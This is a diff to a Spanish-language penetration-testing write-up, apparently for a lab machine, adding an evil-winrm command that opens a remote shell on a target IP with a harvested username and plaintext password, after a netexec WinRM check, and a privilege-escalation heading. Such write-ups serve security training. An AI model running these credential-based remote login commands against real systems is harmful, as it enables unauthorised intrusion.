@@ -234,3 +234,8 @@ nxc winrm 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
 
 Viendo que si pertenece y pudiéndonos conectar al usuario usando la herramienta [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
+```
+
+# Escalada de privilegios
